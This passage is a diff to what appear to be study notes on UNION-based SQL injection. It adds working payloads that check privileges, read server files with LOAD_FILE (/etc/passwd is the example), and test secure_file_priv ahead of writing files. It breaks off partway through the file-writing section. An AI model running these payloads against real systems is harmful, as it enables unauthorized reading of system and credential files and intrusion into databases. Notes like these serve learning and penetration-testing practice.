@@ -131,7 +131,7 @@ Then, we need to check if we have the super admin privileges, which can be found
 SELECT super_priv FROM mysql.user WHERE user="<currentuser>"
 ```
 
-Therefore, when used in union, it becomes:
+Therefore, when used in union injection, it becomes:
 ```
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="<currentuser>"-- -
 ```
@@ -142,4 +142,32 @@ cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_priv
 #if we dont have that many column, grantee can be discarded and left only privilege_type
 ```
 
-If enough privilege is provided, then we 
+If enough privilege is provided, then we can start reading file, the line to read a file looks like this:
+```
+SELECT LOAD_FILE('<fpath');
+```
+Therefore, when used in a union injection, it becomes:
+```
+cn' UNION SELECT 1, LOAD_FILE("<fpath>"), 3, 4-- -
+#Example: 
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+#Note: Whether we can read the file designated depends on whether the user running mysql have enough permission
+```
+
+-Writing Files:
+
+Writing files requires even more constraint then reading files for us to be able to do so, below is the constraints:
+
+1.File Privilege is granted
+2.secure_file_priv variable is not enabled
+3.Write access to the location we wish to write
+
+First we need to see if secure_file_priv variable is enabled, which can be done by the following:
+```
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+```
+Which, when used in union injection, becomes:
+```
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+```
+If the returned result for variable value is empty, that means it is not enabled and we can write it
